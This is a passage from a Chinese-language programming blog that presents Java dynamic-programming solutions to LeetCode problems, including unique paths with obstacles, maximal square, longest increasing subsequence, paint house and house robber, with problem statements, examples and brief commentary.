class="keyword">int</span> <span class="title">uniquePathsWithObstacles</span><span class="params">(<span class="keyword">int</span>[][] obstacleGrid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (obstacleGrid.length == <span class="number">0</span> || obstacleGrid[<span class="number">0</span>].length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (obstacleGrid[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> m = obstacleGrid.length, n = obstacleGrid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[m][n];</span><br><span class="line"></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; ++i) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = obstacleGrid[i][<span class="number">0</span>] == <span class="number">1</span> ? <span class="number">0</span> : dp[i - <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][i] = obstacleGrid[<span class="number">0</span>][i] == <span class="number">1</span> ? <span class="number">0</span> : dp[<span class="number">0</span>][i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">            dp[i][j] = obstacleGrid[i][j] == <span class="number">1</span> ? <span class="number">0</span> : dp[i - <span class="number">1</span>][j] + dp[i][j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="221-maximal-square-">221. Maximal Square -</span></h2><p>在一个由 <em>0</em> 和 <em>1</em> 组成的二维矩阵内，找到只包含 <em>1</em> 的最大正方形，并返回其面积。</p><p><strong>示例</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入: </span><br><span class="line"></span><br><span class="line">1 0 1 0 0</span><br><span class="line">1 0 1 1 1</span><br><span class="line">1 1 1 1 1</span><br><span class="line">1 0 0 1 0</span><br><span class="line"></span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure><p>咋一看是dfs其实不然，试了很多方法都没办法真正解出来。</p><p>其实正方形大小计算就是看它左右还有斜下角是不是1。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximalSquare</span><span class="params">(<span class="keyword">char</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(matrix.length==<span class="number">0</span>||matrix[<span class="number">0</span>].length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> row = matrix.length;</span><br><span class="line">    <span class="keyword">int</span> col = matrix[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[row][col];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;row ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;col ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>||j==<span class="number">0</span>) dp[i][j]=matrix[i][j]==<span class="string">'1'</span>?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (matrix[i][j]==<span class="string">'1'</span>)</span><br><span class="line">                dp[i][j]=min(dp[i-<span class="number">1</span>][j],dp[i-<span class="number">1</span>][j-<span class="number">1</span>],dp[i][j-<span class="number">1</span>])+<span class="number">1</span>;</span><br><span class="line">            res=res&gt;dp[i][j]*dp[i][j]?res:dp[i][j]*dp[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    a=a&gt;b?b:a;</span><br><span class="line">    a=a&gt;c?c:a;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="序列类动态规划问题">序列类动态规划问题</span></h1><h2><span id="300-longest-increasing-subsequence">300. Longest Increasing Subsequence √</span></h2><p>给定一个无序的整数数组，找到其中最长上升子序列的长度。</p><p><strong>示例</strong>:</p><p> 输入: [10,9,2,5,3,7,101,18]<br> 输出: 4<br> 解释: 最长的上升子序列是 [2,3,7,101]，它的长度是 4。</p><p><strong>说明</strong>:</p><p>·  可能会有多种最长上升子序列的组合，你只需要输出对应的长度即可。</p><p>·  你算法的时间复杂度应该为 O(n2) 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> len = nums.length;</span><br><span class="line">        <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">1</span>;</span><br><span class="line">        Arrays.fill(dp,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]&gt;nums[j])</span><br><span class="line">                    dp[i]=Math.max(dp[i],<span class="number">1</span>+dp[j]);                </span><br><span class="line">            &#125;</span><br><span class="line">            max = Math.max(max,dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="leetcode-第-256-号问题粉刷房子">LeetCode 第 256 号问题：粉刷房子 √</span></h2><p>注意：本题为 LeetCode 的付费题目，需要开通会员才能解锁查看与提交代码。</p><p>题目描述</p><p>假如有一排房子，共 <em>n</em> 个，每个房子可以被粉刷成红色、蓝色或者绿色这三种颜色中的一种，你需要粉刷所有的房子并且使其相邻的两个房子颜色不能相同。</p><p>当然，因为市场上不同颜色油漆的价格不同，所以房子粉刷成不同颜色的花费成本也是不同的。每个房子粉刷成不同颜色的花费是以一个 <em>n x 3</em> 的矩阵来表示的。</p><p>例如，<code>costs[0][0]</code>表示第 0 号房子粉刷成红色的成本花费；<code>costs[1][2]</code>表示第 1 号房子粉刷成绿色的花费，以此类推。请你计算出粉刷完所有房子最少的花费成本。</p><p><strong>注意：</strong></p><p>所有花费均为正整数。</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: [[17,2,17],[16,16,5],[14,3,19]]</span><br><span class="line">输出: 10</span><br><span class="line">解释: 将 0 号房子粉刷成蓝色，1 号房子粉刷成绿色，2 号房子粉刷成蓝色。</span><br><span class="line">     最少花费: 2 + 5 + 3 &#x3D; 10。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">paint</span><span class="params">(<span class="keyword">int</span>[][] cost)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res=Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">if</span>(cost.length==<span class="number">0</span>||cost[<span class="number">0</span>].length==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n=cost.length,m=cost[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>][m];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">            dp[i][j]=Math.min(dp[i-<span class="number">1</span>][(j+<span class="number">1</span>)%m],dp[i-<span class="number">1</span>][(j+<span class="number">2</span>)%m])+cost[i-<span class="number">1</span>][j];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h2><span id="198-house-robber">198. House Robber √</span></h2><p>You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed, the only constraint stopping you from robbing each of them is that adjacent houses have security system connected and <strong>it will automatically contact the police if two adjacent houses were broken into on the same night</strong>.</p><p>Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight <strong>without alerting the police</strong>.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3,1]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: Rob house 1 (money &#x3D; 1) and then rob house 3 (money &#x3D; 3).</span><br><span class="line">             Total amount you can rob &#x3D; 1 + 3 &#x3D; 4.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums==<span class="keyword">null</span>||nums.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = nums.length;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> dp[] =<span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">    dp[<span class="number">0</span>]=nums[<span class="number">0</span>];</span><br><span class="line">    dp[<span class="number">1</span>]=Math.max(nums[<span class="number">0</span>],nums[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;len;i++)&#123;</span><br><span class="line">        dp[i]=Math.max(dp[i-<span class="number">1</span>],dp[i-<span class="number">2</span>]+nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[len-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="leetcode-第-265-号问题粉刷房子ii">LeetCode 第 265 号问题：粉刷房子II √</span></h2><p>注意：本题为 LeetCode 的付费题目，需要开通会员才能解锁查看与提交代码。</p><p>题目描述</p><p>假如有一排房子，共 <em>n</em> 个，每个房子可以被粉刷成 <em>k</em> 种颜色中的一种，你需要粉刷所有的房子并且使其相邻的两个房子颜色不能相同。</p><p>当然，因为市场上不同颜色油漆的价格不同，所以房子粉刷成不同颜色的花费成本也是不同的。每个房子粉刷成不同颜色的花费是以一个 <em>n x k</em> 的矩阵来表示的。</p><p>例如，<code>costs[0][0]</code> 表示第 0 号房子粉刷成 0 号颜色的成本花费；<code>costs[1][2]</code> 表示第 1 号房子粉刷成 2 号颜色的成本花费，以此类推。请你计算出粉刷完所有房子最少的花费成本。</p><p><strong>注意：</strong></p><p>所有花费均为正整数。</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: [[1,5,3],[2,9,4]]</span><br><span class="line">输出: 5</span><br><span class="line">解释: 将 0 号房子粉刷成 0 号颜色，1 号房子粉刷成 2 号颜色。最少花费: 1 + 4 &#x3D; 5; </span><br><span class="line">     或者将 0 号房子粉刷成 2 号颜色，1 号房子粉刷成 0 号颜色。最少花费: 3 + 2 &#x3D; 5.</span><br></pre></td></tr></table></figure><p><strong>进阶：</strong><br> 您能否在 <em>O(nk)</em> 的时间复杂度下解决此问题？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">minCostII</span><span class="params">(<span class="keyword">int</span>[][] costs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (costs.length == <span class="number">0</span> || costs[<span class="number">0</span>].length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> n = costs.length, k = costs[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>][k];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;=n; i++) &#123;</span><br><span class="line">        Arrays.fill(dp[i],Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; k; ++j) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; k; ++m) &#123;</span><br><span class="line">                <span class="keyword">if</span> (m != j) &#123;</span><br><span class="line">                    dp[i][m] = Math.min(dp[i][m], dp[i - <span class="number">1</span>][j] + costs[i-<span class="number">1</span>][m] );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> result = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">        result = Math.min(result, dp[n][i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这是可以优化的，我们只需要在第 i - 1 个位置的状态中找到最小值和次小值，在选择第 i 个房子的颜色的时候，我们看当前颜色是不是和最小值的颜色相重，不是的话直接加上最小值，如果相重的话，我们就加上次小值，这样一来，我们把两个嵌套的循环，拆开成两个平行的循环，时间复杂度降至 O(n*k)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">minCostII2</span><span class="params">(<span class="keyword">int</span>[][] costs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (costs.length == <span class="number">0</span> || costs[<span class="number">0</span>].length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> n = costs.length, k = costs[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n][k];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        Arrays.fill(dp[i], Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][i] = costs[<span class="number">0</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="comment">// min1 表示的是最小值，min2 表示的是次小值</span></span><br><span class="line">        <span class="keyword">int</span> min1 = Integer.MAX_VALUE, min2 = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">int</span> minIndex = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; k; ++l) &#123;</span><br><span class="line">            <span class="keyword">if</span> (min1 &gt; dp[i - <span class="number">1</span>][l]) &#123;</span><br><span class="line">                min2 = min1;</span><br><span class="line">                min1 = dp[i - <span class="number">1</span>][l];</span><br><span class="line">                minIndex = l;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (min2 &gt; dp[i - <span class="number">1</span>][l]) &#123;</span><br><span class="line">                min2 = dp[i - <span class="number">1</span>][l];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; k; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (minIndex != j) &#123;</span><br><span class="line">                dp[i][j] = Math.min(dp[i][j], min1 + costs[i][j]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = Math.min(dp[i][j], min2 + costs[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> result = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">        result = Math.min(result, dp[n - <span class="number">1</span>][i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="213-house-robber-ii">213. House Robber II √</span></h2><p>You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed. All houses at this place are <strong>arranged in a circle.</strong> That means the first house is the neighbor of the last one. Meanwhile, adjacent houses have security system connected and <strong>it will automatically contact the police if two adjacent houses were broken into on the same night</strong>.</p><p>Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight <strong>without alerting the police</strong>.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,3,2]</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: You cannot rob house 1 (money &#x3D; 2) and then rob house 3 (money &#x3D; 2),</span><br><span class="line">             because they are adjacent houses.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums==<span class="keyword">null</span>||nums.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = nums.length;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> Math.max(rob(nums,<span class="number">0</span>,len-<span class="number">2</span>),rob(nums,<span class="number">1</span>,len-<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(lo==hi) <span class="keyword">return</span> nums[lo];</span><br><span class="line">    <span class="keyword">int</span> dp[]=<span class="keyword">new</span> <span class="keyword">int</span>[hi-lo+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=nums[lo];</span><br><span class="line">    dp[<span class="number">1</span>]=Math.max(nums[lo],nums[lo+<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=lo+<span class="number">2</span>;i&lt;=hi;i++)&#123;</span><br><span class="line">        dp[i-lo]=Math.max(dp[i-<span class="number">1</span>-lo],dp[i-<span class="number">2</span>-lo]+nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[hi-lo];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="413-arithmetic-slices">413. Arithmetic Slices √</span></h2><p>A sequence of number is called arithmetic if it consists of at least three elements and if the difference between any two consecutive elements is the same.</p><p>For example, these are arithmetic sequence:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1, 3, 5, 7, 9</span><br><span class="line">7, 7, 7, 7</span><br><span class="line">3, -1, -5, -9</span><br></pre></td></tr></table></figure><p>The following sequence is not arithmetic.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1, 1, 2, 5, 7</span><br></pre></td></tr></table></figure><p>A zero-indexed array A consisting of N numbers is given. A slice of that array is any pair of integers (P, Q) such that 0 &lt;= P &lt; Q &lt; N.</p><p>A slice (P, Q) of array A is called arithmetic if the sequence:<br>A[P], A[p + 1], …, A[Q - 1], A[Q] is arithmetic. In particular, this means that P + 1 &lt; Q.</p><p>The function should return the number of arithmetic slices in the array A.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A &#x3D; [1, 2, 3, 4]</span><br><span class="line"></span><br><span class="line">return: 3, for 3 arithmetic slices in A: [1, 2, 3], [2, 3, 4] and [1, 2, 3, 4] itself.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numberOfArithmeticSlices</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(A==<span class="keyword">null</span>||A.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;A.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i]-A[i-<span class="number">1</span>]==A[i-<span class="number">1</span>]-A[i-<span class="number">2</span>])&#123;</span><br><span class="line">                dp[i]=dp[i-<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:dp) res+=i;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="279-perfect-squares">279. Perfect Squares √</span></h2><p>Given a positive integer <em>n</em>, find the least number of perfect square numbers (for example, <code>1, 4, 9, 16, ...</code>) which sum to <em>n</em>.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: n &#x3D; 12</span><br><span class="line">Output: 3 </span><br><span class="line">Explanation: 12 &#x3D; 4 + 4 + 4.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: n &#x3D; 13</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: 13 &#x3D; 4 + 9.</span><br></pre></td></tr></table></figure><p>贪心失败 比如说12</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 